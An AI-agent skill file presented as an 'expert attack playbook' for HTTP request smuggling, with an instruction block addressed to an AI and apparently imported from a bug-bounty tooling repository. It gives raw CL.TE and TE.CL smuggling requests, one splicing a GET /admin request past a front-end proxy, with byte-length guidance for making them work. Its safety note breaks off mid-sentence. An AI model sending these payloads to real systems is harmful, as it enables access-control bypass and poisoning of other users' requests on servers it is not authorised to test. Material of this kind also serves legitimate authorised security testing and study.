---
name: request-smuggling
description: HTTP request smuggling and desynchronization testing. Use when front proxies, CDNs, or load balancers disagree with the origin on message framing (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when exploring client-side desync via browser fetch pipelines.
scope: web2
---
HTTP request smuggling and desynchronization testing. Use when front proxies, CDNs, or load balancers disagree with the origin on message framing (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when exploring client-side desync via browser fetch pipelines.

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser fetch pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.


## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes Content-Length, back end prioritizes Transfer-Encoding: chunked. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

- Front end reads only 13 bytes based on Content-Length: 13 (that is, 0\r\n\r\nSMUGGLED, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the 0 end chunk, it treats **SMUGGLED and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads Content-Length. Set **CL equal to the number of bytes in the chunk-length line** (commonly 4: two hex characters + \r\n), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; 35 hex chunk length = 53 bytes):

POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0



On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test onl
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/request-smuggling/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
